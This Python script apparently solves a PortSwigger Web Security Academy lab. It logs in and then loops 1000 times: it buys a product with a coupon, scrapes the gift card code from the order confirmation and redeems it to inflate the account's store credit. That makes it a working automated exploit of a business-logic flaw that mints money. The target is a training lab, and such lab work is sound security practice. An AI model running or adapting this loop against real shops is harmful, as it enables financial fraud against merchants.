import requests
import re
import time
import sys

LAB_ID = "0a24004003fb94f9821b3803005e00af"
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

def get_csrf(url, form_action=None):
    r = s.get(url)
    if form_action:
        pattern = fr'action=["\']?{form_action}["\']?.*?name="csrf" value="([^"]+)"'
        match = re.search(pattern, r.text, re.DOTALL)
    else:
        match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return match.group(1) if match else None

csrf = get_csrf(f"{BASE_URL}/login")
s.post(f"{BASE_URL}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

for i in range(1000):
    try:
        csrf = get_csrf(f"{BASE_URL}/cart")
        s.post(f"{BASE_URL}/cart", data={"csrf": csrf, "productId": "2", "redir": "CART", "quantity": "1"}, allow_redirects=False)

        csrf = get_csrf(f"{BASE_URL}/cart", "/cart/coupon")
        s.post(f"{BASE_URL}/cart/coupon", data={"csrf": csrf, "coupon": "SIGNUP30"}, allow_redirects=False)

        csrf = get_csrf(f"{BASE_URL}/cart", "/cart/checkout")
        s.post(f"{BASE_URL}/cart/checkout", data={"csrf": csrf}, allow_redirects=False)

        r_confirm = s.get(f"{BASE_URL}/cart/order-confirmation?order-confirmed=true")
        match = re.search(r'<table class=is-table-numbers>.*?<td>([A-Za-z0-9]{10})</td>', r_confirm.text, re.DOTALL)

        if match:
            gift_card = match.group(1)
            csrf = get_csrf(f"{BASE_URL}/my-account")
            s.post(f"{BASE_URL}/gift-card", data={"csrf": csrf, "gift-card": gift_card})
            
            r_acc = s.get(f"{BASE_URL}/my-account")
            bal = re.search(r'Store credit: \$([0-9.]+)', r_acc.text)
            current_bal = bal.group(1) if bal else "?"
            
            sys.stdout.write(f"\r[*] Iteration: {i+1} | Code: {gift_card} | Balance: ${current_bal}    ")
            sys.stdout.flush()
        else:
            sys.stdout.write(f"\r[*] Iteration: {i+1} | Code not found                          ")
            sys.stdout.flush()

        time.sleep(0.1)

    except Exception as e:
        sys.stdout.write(f"\r[*] Iteration: {i+1} | Error: {e}                          ")
        sys.stdout.flush()

print("\n[*] Done! Go buy the jacket.")